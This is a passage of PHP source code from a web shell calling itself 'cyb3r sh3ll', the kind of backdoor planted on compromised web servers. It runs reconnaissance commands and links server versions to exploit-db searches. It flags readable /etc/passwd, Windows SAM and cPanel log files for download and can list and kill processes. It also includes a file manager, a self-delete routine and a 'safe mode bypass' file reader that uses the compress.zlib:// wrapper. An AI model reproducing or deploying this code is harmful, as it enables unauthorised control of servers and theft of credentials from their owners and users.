 if (file_get_contents("/etc/motd")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=motd&d=".urlencode("/etc")."&ft=txt\"><u><b>Message Of The Day</b></u></a></font></b><br>";}

 if (file_get_contents("/etc/hosts")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=hosts&d=".urlencode("/etc")."&ft=txt\"><u><b>Hosts</b></u></a></font></b><br>";}

 function displaysecinfo($name,$value) {if (!empty($value)) {if (!empty($name)) {$name = "<b>".$name." - </b>";} echo $name.nl2br($value)."<br>";}}

 displaysecinfo("OS Version?",myshellexec("cat /proc/version"));

 displaysecinfo("Kernel version?",myshellexec("sysctl -a | grep version"));

 displaysecinfo("Distrib name",myshellexec("cat /etc/issue.net"));

 displaysecinfo("Distrib name (2)",myshellexec("cat /etc/*-realise"));

 displaysecinfo("CPU?",myshellexec("cat /proc/cpuinfo"));

 displaysecinfo("RAM",myshellexec("free -m"));

 displaysecinfo("HDD space",myshellexec("df -h"));

 displaysecinfo("List of Attributes",myshellexec("lsattr -a"));

 displaysecinfo("Mount options ",myshellexec("cat /etc/fstab"));

 displaysecinfo("Is cURL installed?",myshellexec("which curl"));

 displaysecinfo("Is lynx installed?",myshellexec("which lynx"));

 displaysecinfo("Is links installed?",myshellexec("which links"));

 displaysecinfo("Is fetch installed?",myshellexec("which fetch"));

 displaysecinfo("Is GET installed?",myshellexec("which GET"));

 displaysecinfo("Is perl installed?",myshellexec("which perl"));

 displaysecinfo("Where is apache",myshellexec("whereis apache"));

 displaysecinfo("Where is perl?",myshellexec("whereis perl"));

 displaysecinfo("locate proftpd.conf",myshellexec("locate proftpd.conf"));

 displaysecinfo("locate httpd.conf",myshellexec("locate httpd.conf"));

 displaysecinfo("locate my.conf",myshellexec("locate my.conf"));

 displaysecinfo("locate psybnc.conf",myshellexec("locate psybnc.conf"));

}

if ($act == "mkfile")

{
 if ($mkfile != $d)

 {
  if (file_exists($mkfile)) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: object alredy exists";}

  elseif (!fopen($mkfile,"w")) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: access denied";}

  else {$act = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile);}

 }
 else {$act = $dspact = "ls";}

}

if ($act == "encoder")

{
 echo "<script>function set_encoder_input(text) {document.forms.encoder.input.value = text;}</script><center><b>Encoder:</b></center><form name=\"encoder\" action=\"".$surl."\" method=POST><input type=hidden name=act value=encoder><b>Input:</b><center><textarea name=\"encoder_input\" id=\"input\" cols=50 rows=5>".@htmlspecialchars($encoder_input)."</textarea><br><br><input type=submit value=\"calculate\"><br><br></center><b>Hashes</b>:<br><center>";

 foreach(array("md5","crypt","sha1","crc32") as $v)

 {
  echo $v." - <input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$v($encoder_input)."\" readonly><br>";
 }

 echo "</center><b>Url:</b><center><br>urlencode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".urlencode($encoder_input)."\" readonly>

 <br>urldecode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".htmlspecialchars(urldecode($encoder_input))."\" readonly>

 <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_encode($encoder_input)."\" readonly></center>";

 echo "<center>base64_decode - ";

 if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {echo "<input type=text size=35 value=\"failed\" disabled readonly>";}

 else

 {

  $debase64 = base64_decode($encoder_input);

  $debase64 = str_replace("\0","[0]",$debase64);

  $a = explode("\r\n",$debase64);

  $rows = count($a);

  $debase64 = htmlspecialchars($debase64);

  if ($rows == 1) {echo "<input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$debase64."\" id=\"debase64\" readonly>";}

  else {$rows++; echo "<textarea cols=\"40\" rows=\"".$rows."\" onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" id=\"debase64\" readonly>".$debase64."</textarea>";}

  echo "&nbsp;<a href=\"#\" onclick=\"set_encoder_input(document.forms.encoder.debase64.value)\"><b>^</b></a>";

 }

 echo "</center><br><b>Base convertations</b>:<center>dec2hex - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"";

 $c = strlen($encoder_input);

 for($i=0;$i<$c;$i++)

 {
  $hex = dechex(ord($encoder_input[$i]));

  if ($encoder_input[$i] == "&") {echo $encoder_input[$i];}

  elseif ($encoder_input[$i] != "\\") {echo "%".$hex;}
 }

 echo "\" readonly><br></center></form>";

}

if ($act == "selfremove")
{
 if (($submit == $rndcode) and ($submit != ""))

 {

  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using cyb3r sh3ll v.".$shver."!"; cyb3rexit(); }

  else {echo "<center><b>Can't delete ".__FILE__."!</b></center>";}

 }

 else

 {

  if (!empty($rndcode)) {echo "<b>Error: Incorrect Confimation!</b>";}

  $rnd = rand(0,9).rand(0,9).rand(0,9);

  echo "<form action=\"".$surl."\"><input type=hidden name=act value=selfremove><b>Self-remove: ".__FILE__." <br><b>Are you sure?<br>For confirmation, enter \"".$rnd."\"</b>:&nbsp;<input type=hidden name=rndcode value=\"".$rnd."\"><input type=text name=submit>&nbsp;<input type=submit value=\"YES\"></form>";

 }

}

if ($act == "serverinfo")
{

global $windows,$disablefunctions,$safemode;
$cwd= getcwd();
$mil="<a target=\"_blank\" href=\"http://www.exploit-db.com/search/?action=search&filter_exploit_text=";
$basedir=(ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"ON":"OFF";
if (!empty($_SERVER["PROCESSOR_IDENTIFIER"])) $CPU = $_SERVER["PROCESSOR_IDENTIFIER"];
$osver=$tsize=$fsize='';
if ($windows){ 
$osver = "  (".shelL("ver").")";
$sysroot = shelL("echo %systemroot%");
if (empty($sysroot)) $sysroot = $_SERVER["SystemRoot"];
if (empty($sysroot)) $sysroot = getenv("windir");
if (empty($sysroot)) $sysroot = "Not Found";
if (empty($CPU))$CPU = shelL("echo %PROCESSOR_IDENTIFIER%");
for ($i=66;$i<=90;$i++){
$drive= chr($i).':\\';
if (is_dir($drive)){
$fsize+=@disk_free_space($drive);
$tsize+=@disk_total_space($drive);
}
}
}else{
$fsize=disk_free_space('/');
$tsize=disk_total_space('/');
}
$disksize="Used Space: ". showsizE($tsize-$fsize) . "   Free Space: ". showsizE($fsize) . "   Total Space: ". showsizE($tsize);
if (empty($CPU)) $CPU = "Unknown";
$os = php_unamE();
$osn=php_unamE('s');
if(!$windows){ 
$ker = php_unamE('r');
$o=($osn=="Linux")?"Linux+Kernel":$osn;
$os = str_replace($osn,"${mil}$o\"><font color='yellow'>$osn</font></a>",$os);
$os = str_replace($ker,"${mil}Linux+Kernel\"><font color='yellow'>$ker</font></a>",$os);
$inpa=':';
}else{
$sam = $sysroot."\\system32\\config\\SAM";
$inpa=';';
$os = str_replace($osn,"${mil}MS+Windows\"><font color='yellow'>$osn</font></a>",$os);
}
$software=str_replace("Apache","${mil}Apache\"><font color='#66ffff'>Apache</font></a>",$_SERVER['SERVER_SOFTWARE']);
echo "
<table border=1 cellpadding=0 cellspacing=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\"  width=\"100%\" >
 <tr><td><b>Server information:</b></td></tr>
 <tr><td width=\"25%\" bgcolor=\"#666666\">Server:</td>
 <td bgcolor=\"#666666\">".$_SERVER["HTTP_HOST"];
if (!empty($_SERVER["SERVER_ADDR"])){
 echo "(". $_SERVER["SERVER_ADDR"] .")";}
echo "
</td></tr>
<tr><td width=\"25%\" >Operation System:</td>    <td >$os$osver</td></tr>
<tr><td width=\"25%\" bgcolor=\"#666666\">Web server Application:</td>  <td bgcolor=\"#666666\">$software</td></tr>
<tr><td width=\"25%\" >CPU:</td>  <td >$CPU</td></tr>
 <td width=\"25%\" bgcolor=\"#666666\">Disk status:</td><td bgcolor=\"#666666\">$disksize</td></tr>
<tr><td width=\"25%\" >User domain:</td><td >";
if (!empty($_SERVER['USERDOMAIN'])) echo $_SERVER['USERDOMAIN'];
else echo "Unknown"; 
echo "
</td></tr><tr><td width=\"25%\" bgcolor=\"#666666\"><a href=\"".$surl."act=processes\" ><font color=#66ffff>User Name </font>:</a></td>
<td bgcolor=\"#666666\">";$cuser=get_current_user();if (!empty($cuser)) echo get_current_user();
else echo "Unknown"; echo "</td></tr>";
if ($windows){
echo "
<tr><td width=\"25%\" >Windows directory:</td><td ><a href=\"".$surl."act=ls&d=$sysroot"."\"><font color=yellow>$sysroot</font></a></td></tr><tr>
<td width=\"25%\" bgcolor=\"#666666\">Sam file:</td><td bgcolor=\"#666666\">";
if (is_readable(($sam)))echo "<a href=\"".hlinK("?workingdiR=$sysroot\\system32\\config&downloaD=sam")."\">
<font color=#66ffff>Readable</font></a>"; else echo "Not readable";echo "</td></tr>";
}
else
{
echo "<tr><td width=\"25%\" >Passwd file:</td><td >";
if (is_readable('/etc/passwd')) echo "
<a href=\"".hlinK("seC=edit&filE=/etc/passwd&workingdiR=$cwd")."\">Readable</a>"; else echo'Not readable';echo "</td></tr><tr><td width=\"25%\" bgcolor=\"#666666\">Cpanel log file:</td><td bgcolor=\"#666666\">";
if (file_exists("/var/cpanel/accounting.log")){if (is_readable("/var/cpanel/accounting.log")) echo "<a href=\"".hlinK("seC=edit&filE=/var/cpanel/accounting.log&workingdiR=$cwd")."\"><font color=#66ffff>Readable</font></a>"; else echo "Not readable";}else echo "Not found";
echo "</td></tr>";
}
$uip =(!empty($_SERVER['REMOTE_ADDR']))?$_SERVER['REMOTE_ADDR']:getenv('REMOTE_ADDR');
echo "
<tr><td width=\"25%\" >${mil}PHP\"><font color=yellow>PHP</font></a> version:</td>
<td ><a href=\"?=".php_logo_guid()."\" target=\"_blank\"><font color=yellow>".PHP_VERSION."</font></a> 
(<a href=\"".$surl."act=phpinfo\"><font color=yellow>more...</font></a>)</td></tr>
<tr><td width=\"25%\" bgcolor=\"#666666\">Zend version:</td>
<td bgcolor=\"#666666\">";if (function_exists('zend_version')) echo "<a href=\"?=".zend_logo_guid()."\" target=\"_blank\"><font color=#66ffff>".zend_version()."</font></a>";
else echo "Not Found";echo "</td>
<tr><td width=\"25%\" >Include path:</td>
<td >".str_replace($inpa," ",DEFAULT_INCLUDE_PATH)."</td>
<tr><td width=\"25%\" bgcolor=\"#666666\">PHP Modules:</td>
<td bgcolor=\"#666666\">";$ext=get_loaded_extensions();foreach($ext as $v)echo $v." ";
echo "</td><tr><td width=\"25%\" >Disabled functions:</td><td >";
if(!empty($disablefunctions))echo $disablefunctions;else echo "Nothing"; echo"</td></tr>
<tr><td width=\"25%\" bgcolor=\"#666666\">Safe mode:</td><td bgcolor=\"#666666\">$sfmode</font></td></tr>
<tr><td width=\"25%\" >Open base dir:</td><td >$basedir</td></tr>
<tr><td width=\"25%\" bgcolor=\"#666666\">DBMS:</td>
<td bgcolor=\"#666666\">";$sq="";
if(function_exists('mysql_connect')) $sq= "${mil}MySQL\"><font color=#66ffff>MySQL</font></a> ";
if(function_exists('mssql_connect')) $sq.= " ${mil}MSSQL\"><font color=#66ffff>MSSQL</font></a> ";
if(function_exists('ora_logon')) $sq.= " ${mil}Oracle\"><font color=#66ffff>Oracle</font></a> ";
if(function_exists('sqlite_open')) $sq.= " SQLite ";
if(function_exists('pg_connect')) $sq.= " ${mil}PostgreSQL\"><font color=#66ffff>PostgreSQL</font></a> ";
if(function_exists('msql_connect')) $sq.= " mSQL ";
if(function_exists('mysqli_connect'))$sq.= " MySQLi ";
if(function_exists('ovrimos_connect')) $sq.= " Ovrimos SQL ";
if ($sq=="") $sq= "Nothing"; 

echo "$sq</td></tr>";if (function_exists('curl_init')) echo "<tr><td width=\"25%\" >cURL support:</td><td >Enabled ";
if(function_exists('curl_version')){$ver=curl_version();echo "(Version:". $ver['version']." OpenSSL version:". $ver['ssl_version']." zlib version:". $ver['libz_version']." host:". $ver['host'] .")";}echo "</td></tr>";echo "</table>";

}

if ($act == "clientinfo")
{
echo "<table><tr><td><b>User information</b>:</td></tr><tr><td width=\"25%\" bgcolor=\"#666666\">IP:</td><td bgcolor=\"#666666\">".$_SERVER['REMOTE_ADDR']."</td></tr><tr><td width=\"25%\" >Agent:</td><td >".getenv('HTTP_USER_AGENT')."</td></tr></table>";
}

if ($act == "processes")

{

 echo "<b>Processes:</b><br>";

 if (!$win) {$handler = "ps -aux".($grep?" | grep '".addslashes($grep)."'":"");}

 else {$handler = "tasklist";}

 $ret = myshellexec($handler);

 if (!$ret) {echo "Can't execute \"".$handler."\"!";}

 else

 {

  if (empty($processes_sort)) {$processes_sort = $sort_default;}

  $parsesort = parsesort($processes_sort);

  if (!is_numeric($parsesort[0])) {$parsesort[0] = 0;}

  $k = $parsesort[0];

  if ($parsesort[1] != "a") {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."act=img&img=sort_desc\" height=\"9\" width=\"14\" border=\"0\"></a>";}

  else {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."act=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"></a>";}

  $ret = htmlspecialchars($ret);

  if (!$win)

  {

   if ($pid)

   {

    if (is_null($sig)) {$sig = 9;}

    echo "Sending signal ".$sig." to #".$pid."... ";

    if (posix_kill($pid,$sig)) {echo "OK.";}

    else {echo "ERROR.";}

   }

   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}

   $stack = explode("\n",$ret);

   $head = explode(" ",$stack[0]);

   unset($stack[0]);

   for($i=0;$i<count($head);$i++)

   {

    if ($i != $k) {$head[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".$head[$i]."</b></a>";}

   }

   $prcs = array();

   foreach ($stack as $line)

   {

    if (!empty($line))

{

 echo "<tr>";

     $line = explode(" ",$line);

     $line[10] = join(" ",array_slice($line,10));

     $line = array_slice($line,0,11);

     if ($line[0] == get_current_user()) {$line[0] = "<font color=green>".$line[0]."</font>";}

     $line[] = "<a href=\"".$surl."act=processes&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"><u>KILL</u></a>";

     $prcs[] = $line;

     echo "</tr>";

    }

   }

  }

  else

  {

   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}

   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}

   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}

   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}

   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}

   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}

   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}

   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}

   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);}

   while (ereg("",$ret)) {$ret = str_replace("","",$ret);}

   while (ereg(" ",$ret)) {$ret = str_replace(" ","",$ret);}

   $ret = convert_cyr_string($ret,"d","w");

   $stack = explode("\n",$ret);

   unset($stack[0],$stack[2]);

   $stack = array_values($stack);

   $head = explode("",$stack[0]);

   $head[1] = explode(" ",$head[1]);

   $head[1] = $head[1][0];

   $stack = array_slice($stack,1);

   unset($head[2]);

   $head = array_values($head);

   if ($parsesort[1] != "a") {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"".$surl."act=img&img=sort_desc\" height=\"9\" width=\"14\" border=\"0\"></a>";}

   else {$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"".$surl."act=img&img=sort_asc\" height=\"9\" width=\"14\" border=\"0\"></a>";}

   if ($k > count($head)) {$k = count($head)-1;}

   for($i=0;$i<count($head);$i++)

   {

    if ($i != $k) {$head[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".trim($head[$i])."</b></a>";}

   }

   $prcs = array();

   foreach ($stack as $line)

   {

    if (!empty($line))

    {

     echo "<tr>";

     $line = explode("",$line);

     $line[1] = intval($line[1]); $line[2] = $line[3]; unset($line[3]);

     $line[2] = intval(str_replace(" ","",$line[2]))*1024; 

     $prcs[] = $line;

     echo "</tr>";

    }

   }

  }

  $head[$k] = "<b>".$head[$k]."</b>".$y;

  $v = $processes_sort[0];

  usort($prcs,"tabsort");

  if ($processes_sort[1] == "d") {$prcs = array_reverse($prcs);}

  $tab = array();

  $tab[] = $head;

  $tab = array_merge($tab,$prcs);

  echo "<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#15354c borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\">";

  foreach($tab as $i=>$k)

  {

   echo "<tr>";

   foreach($k as $j=>$v) {if ($win and $i > 0 and $j == 2) {$v = view_size($v);} echo "<td>".$v."</td>";}

   echo "</tr>";

  }

  echo "</table>";

 }

}

if ($act == "ls")
{
 if (count($ls_arr) > 0) {$list = $ls_arr;}
 else
 {

  $list = array();

  if ($h = @opendir($d))

  {

   while (($o = readdir($h)) !== FALSE) {$list[] = $d.$o;}

   closedir($h);

  }

  else {}

 }

 if (count($list) == 0) {echo "<center><b>Can't open folder (".htmlspecialchars($d).")!</b></center>";}
 else
 {

  //Building array

  $objects = array();

  $vd = "f"; //Viewing mode

  if ($vd == "f")

  {

   $objects["head"] = array();

   $objects["folders"] = array();

   $objects["links"] = array();

   $objects["files"] = array();

   foreach ($list as $v)

   {

    $o = basename($v);

    $row = array();

    if ($o == ".") {$row[] = $d.$o; $row[] = "LINK";}

    elseif ($o == "..") {$row[] = $d.$o; $row[] = "LINK";}

    elseif (is_dir($v))

    {

     if (is_link($v)) {$type = "LINK";}

     else {$type = "DIR";}

     $row[] = $v;

     $row[] = $type;

    }

    elseif(is_file($v)) {$row[] = $v; $row[] = filesize($v);}

    $row[] = filemtime($v);

    if (!$win)

    {

     $ow = posix_getpwuid(fileowner($v));

     $gr = posix_getgrgid(filegroup($v));

     $row[] = ($ow["name"]?$ow["name"]:fileowner($v))."/".($gr["name"]?$gr["name"]:filegroup($v));

    }

    $row[] = fileperms($v);

    if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;}

    elseif (is_link($v)) {$objects["links"][] = $row;}

    elseif (is_dir($v)) {$objects["folders"][] = $row;}

    elseif (is_file($v)) {$objects["files"][] = $row;}

    $i++;

   }

   $row = array();

   $row[] = "<b>Name</b>";

   $row[] = "<b>Size</b>";

   $row[] = "<b>Modify</b>";

   if (!$win)

  {$row[] = "<b>Owner/Group</b>";}

   $row[] = "<b>Perms</b>";

   $row[] = "<b>Action</b>";

   $parsesort = parsesort($sort);

   $sort = $parsesort[0].$parsesort[1];

   $k = $parsesort[0];

   if ($parsesort[1] != "a") {$parsesort[1] = "d";}

   $y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k.($parsesort[1] == "a"?"d":"a")."\">";

   $y .= "<img src=\"".$surl."act=img&img=sort_".($sort[1] == "a"?"asc":"desc")."\" height=\"9\" width=\"14\" alt=\"".($parsesort[1] == "a"?"Asc.":"Desc")."\" border=\"0\"></a>";

   $row[$k] .= $y;

   for($i=0;$i<count($row)-1;$i++)

   {

    if ($i != $k) {$row[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$parsesort[1]."\">".$row[$i]."</a>";}

   }

   $v = $parsesort[0];

   usort($objects["folders"], "tabsort");

   usort($objects["links"], "tabsort");

   usort($objects["files"], "tabsort");

   if ($parsesort[1] == "d")

   {

    $objects["folders"] = array_reverse($objects["folders"]);

    $objects["files"] = array_reverse($objects["files"]);

   }

   $objects = array_merge($objects["head"],$objects["folders"],$objects["links"],$objects["files"]);

   $tab = array();

   $tab["cols"] = array($row);

   $tab["head"] = array();

   $tab["folders"] = array();

   $tab["links"] = array();

   $tab["files"] = array();

   $i = 0;

   foreach ($objects as $a)

   {

    $v = $a[0];

    $o = basename($v);

    $dir = dirname($v);

    if ($disp_fullpath) {$disppath = $v;}

    else {$disppath = $o;}

    $disppath = str2mini($disppath,60);

    if (in_array($v,$sess_data["cut"])) {$disppath = "<strike>".$disppath."</strike>";}

    elseif (in_array($v,$sess_data["copy"])) {$disppath = "<u>".$disppath."</u>";}

    foreach ($regxp_highlight as $r)

    {

     if (ereg($r[0],$o))

     {

      if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; cyb3rexit();}

      else

      {

       $r[1] = round($r[1]);

       $isdir = is_dir($v);

       if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir))

       {

        if (empty($r[2])) {$r[2] = "<b>"; $r[3] = "</b>";}

        $disppath = $r[2].$disppath.$r[3];

        if ($r[4]) {break;}

       }

      }

     }

    }

    $uo = urlencode($o);

    $ud = urlencode($dir);

    $uv = urlencode($v);

    $row = array();

    if ($o == ".")

    {

     $row[] = "<img src=\"".$surl."act=img&img=small_dir\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\">".$o."</a>";

     $row[] = "LINK";

    }

    elseif ($o == "..")

    {

     $row[] = "<img src=\"".$surl."act=img&img=ext_lnk\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\">".$o."</a>";

     $row[] = "LINK";

    }

    elseif (is_dir($v))

    {

     if (is_link($v))

     {

      $disppath .= " => ".readlink($v);

      $type = "LINK";

      $row[] =  "<img src=\"".$surl."act=img&img=ext_lnk\" height=\"16\" width=\"16\" border=\"0\">&nbsp;<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\">[".$disppath."]</a>";

     }

     else

     {

      $type = "DIR";

      $row[] =  "<img src=\"".$surl."act=img&img=small_dir\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\">[".$disppath."]</a>";

      }

     $row[] = $type;

    }

    elseif(is_file($v))

    {

     $ext = explode(".",$o);

     $c = count($ext)-1;

     $ext = $ext[$c];

     $ext = strtolower($ext);

     $row[] =  "<img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;<a href=\"".$surl."act=f&f=".$uo."&d=".$ud."&\">".$disppath."</a>";

     $row[] = view_size($a[1]);

    }

    $row[] = date("d.m.Y H:i:s",$a[2]);

    if (!$win) {$row[] = $a[3];}

    $row[] = "<a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"><b>".view_perms_color($v)."</b></a>";

    if ($o == ".") {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\">"; $i--;}

    else {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\">";}

    if (is_dir($v)) {$row[] = "<a href=\"".$surl."act=d&d=".$uv."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;".$checkbox;}

    else {$row[] = "<a href=\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\"><img src=\"".$surl."act=img&img=change\" alt=\"Change\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\"><img src=\"".$surl."act=img&img=download\" alt=\"Download\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;".$checkbox;}

    if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;}

    elseif (is_link($v)) {$tab["links"][] = $row;}

    elseif (is_dir($v)) {$tab["folders"][] = $row;}

    elseif (is_file($v)) {$tab["files"][] = $row;}

    $i++;

   }

  }

  // Compiling table

  $table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);

  echo "<center><b>Listing folder (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders):</b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#15354c borderColorLight=#433333 border=0><form action=\"".$surl."\" method=POST name=\"ls_form\"><input type=hidden name=act value=".$dspact."><input type=hidden name=d value=".$d.">";

  foreach($table as $row)

  {

   echo "<tr>\r\n";

   foreach($row as $v) {echo "<td>".$v."</td>\r\n";}

   echo "</tr>\r\n";

  }

  echo "</table><br><hr size=\"1\" noshade><p align=\"right\">

  <script>

  function ls_setcheckboxall(status)

  {

   var id = 1;

   var num = ".(count($table)-2).";

   while (id <= num)

   {

    document.getElementById('actbox'+id).checked = status;

    id++;

   }

  }

  function ls_reverse_all()

  {

   var id = 1;

   var num = ".(count($table)-2).";

   while (id <= num)

   {

    document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked;

    id++;

   }

  }

  </script>

  <input type=\"button\" onclick=\"ls_setcheckboxall(true);\" value=\"Select all\">&nbsp;&nbsp;<input type=\"button\" onclick=\"ls_setcheckboxall(false);\" value=\"Unselect all\"> 

  <b><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\">";

  if (count(array_merge($sess_data["copy"],$sess_data["cut"])) > 0 and ($usefsbuff))

  {

   echo "<input type=submit name=actarcbuff value=\"Pack buffer to archive\">&nbsp;<input type=\"text\" name=\"actarcbuff_path\" value=\"archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actpastebuff\" value=\"Paste\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actemptybuff\" value=\"Empty buffer\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";

  }

  echo "<select name=act><option value=\"".$act."\">With selected:</option>";

  echo "<option value=delete".($dspact == "delete"?" selected":"").">Delete</option>";

  echo "<option value=chmod".($dspact == "chmod"?" selected":"").">Change-mode</option>";

  if ($usefsbuff)

  {

   echo "<option value=cut".($dspact == "cut"?" selected":"").">Cut</option>";

   echo "<option value=copy".($dspact == "copy"?" selected":"").">Copy</option>";

   echo "<option value=unselect".($dspact == "unselect"?" selected":"").">Unselect</option>";

  }

  echo "</select>&nbsp;<input type=submit value=\"Confirm\"></p>";

  echo "</form><hr size=\"1\" noshade>";
 } 
 ?>
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" borderColorLight=#c0c0c0 border=1>
     <tr> <!-- 1 -->
	   <td valign="top" width="33%" ><p align="center"><b>:: PHP Safe Mode Bypass ::</b></p></td>
	   <td valign="top" width="33%" ><p align="center"><b>:: Make File/Directory ::</b></p></td>
	   <td valign="top" ><p align="center"><b>:: Go File/Directory ::</b></p></td>
	 </tr>
     <tr><!-- 3 -->
	 <td valign="top">

   <center><b>(: List Directories :)</b>    <form action="<?php echo $surl; ?>">

      <div align="center"><br>

      Dir: <input type="text" name="directory" method="get"> <input type="submit" value="List Directory"><br><br> eg: /etc/<br></div>
<?php

	

	function rsg_glob()

{

$chemin=$_GET['directory'];

$files = glob("$chemin*");

echo "Trying To List Folder <font color=#000099><b>$chemin</b></font><br>";

foreach ($files as $filename) {

	echo "<pre>";

   echo "$filename\n";

   echo "</pre>";

}

}



if(isset($_GET['directory']))

{

rsg_glob();

}



?>


    </form></center>

    </td>
	 <td>
	 <center><b>[: Make Directory :]</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center>
	 </td>
	 <td>
	 <center><b>{: Go Directory :}</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center>
	 </td>
	 </tr>
          <tr><!-- 2 -->
	    <td valign="top">

         <div align="center"><b>(: Read Files :)</b></div><br>

         <form action="<?php echo $surl; ?>">

            <div align="center">File: <input type="text" name="file" method="get"> <input type="submit" value="Read File"><br><br> eg: /etc/passwd<br>
			<?php     

      function rsg_read()

	{	

	$test="";

	$temp=tempnam($test, "cx");

	$file=$_GET['file'];	

	$get=htmlspecialchars($file);

	echo "<br>Trying To Get File <font color=#000099><b>$get</b></font><br>";

	if(copy("compress.zlib://".$file, $temp)){

	$fichier = fopen($temp, "r");

	$action = fread($fichier, filesize($temp));

	fclose($fichier);

	$source=htmlspecialchars($action);

	echo "<div class=\"shell\"><b>Start $get</b><br><br><font color=\"white\">$source</font><br><b><br>Fin <font color=#000099>$get</font></b>";

	unlink($temp);

	} else {

	die("<FONT COLOR=\"RED\"><CENTER>Sorry... File

	<B>".htmlspecialchars($file)."</B> dosen't exists or you don't have

	access.</CENTER></FONT>");

			}

	echo "</div>";

	}

	

